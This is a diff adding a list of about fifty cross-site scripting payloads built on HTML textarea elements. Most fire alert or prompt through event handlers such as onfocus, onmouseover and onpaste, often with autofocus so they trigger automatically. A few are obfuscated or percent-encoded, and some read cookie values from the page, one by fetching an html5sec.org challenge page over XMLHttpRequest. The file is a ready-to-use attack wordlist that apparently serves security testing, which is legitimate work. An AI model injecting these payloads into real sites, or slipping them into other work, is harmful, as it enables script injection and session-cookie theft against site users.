@@ -1,0 +1,54 @@
+<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
+<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
+“><textarea autofocus onfocus=prompt(1)>
+“><textarea autofocus onfocus=co\u006efir\u006d(1)>
+<textarea autofocus onfocus=alert(1)>test</textarea>
+<textarea autofocus onfocusin=alert(1)>test</textarea>
+<textarea draggable="true" ondrag="alert(1)">test</textarea>
+<textarea draggable="true" ondragend="alert(1)">test</textarea>
+<textarea draggable="true" ondragenter="alert(1)">test</textarea>
+<textarea draggable="true" ondragleave="alert(1)">test</textarea>
+<textarea draggable="true" ondragstart="alert(1)">test</textarea>
+<textarea id=x tabindex=1 onactivate=alert(1)></textarea>
+<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>
+<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>
+<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>
+<textarea onafterscriptexecute=alert(1)><script>1</script>
+<textarea onauxclick=alert(1)>XSS</textarea>
+<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>
+<textarea onbeforecut=alert(1) autofocus>XSS</textarea>
+<textarea onbeforepaste=alert(1) autofocus></textarea>
+<textarea onbeforescriptexecute=alert(1)><script>1</script>
+<textarea onblur=alert(1) id=x></textarea><input autofocus>
+<textarea onchange=alert(1)>XSS</textarea>
+<textarea onclick="alert(1)">test</textarea>
+<textarea oncontextmenu="alert(1)">test</textarea>
+<textarea oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<textarea oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<textarea ondblclick="alert(1)" autofocus tabindex=1>test</textarea>
+<textarea onfocusout=alert(1) id=x></textarea><input autofocus>
+<textarea oninput=alert(1)>XSS</textarea>
+<textarea onkeydown="alert(1)" contenteditable>test</textarea>
+<textarea onkeypress="alert(1)" contenteditable>test</textarea>
+<textarea onkeyup="alert(1)" contenteditable>test</textarea>
+<textarea onmousedown="alert(1)">test</textarea>
+<textarea onmouseenter="alert(1)">test</textarea>
+<textarea onmouseleave="alert(1)">test</textarea>
+<textarea onmousemove="alert(1)">test</textarea>
+<textarea onmouseout="alert(1)">test</textarea>
+<textarea onmouseover="alert(1)">test</textarea>
+<textarea onmouseup="alert(1)">test</textarea>
+<textarea onmousewheel=alert(1)>requires scrolling
+<textarea onpaste=alert(1) autofocus></textarea>
+<textarea onpointerdown=alert(1)>XSS</textarea>
+<textarea onpointerenter=alert(1)>XSS</textarea>
+<textarea onpointerleave=alert(1)>XSS</textarea>
+<textarea onpointermove=alert(1)>XSS</textarea>
+<textarea onpointerout=alert(1)>XSS</textarea>
+<textarea onpointerover=alert(1)>XSS</textarea>
+<textarea onpointerrawupdate=alert(1)>XSS</textarea>
+<textarea onpointerup=alert(1)>XSS</textarea>
+<textarea onselect=alert(1) autofocus>XSS</textarea>
+<textarea autofocus onfocus=alert(1)>//INJECTX
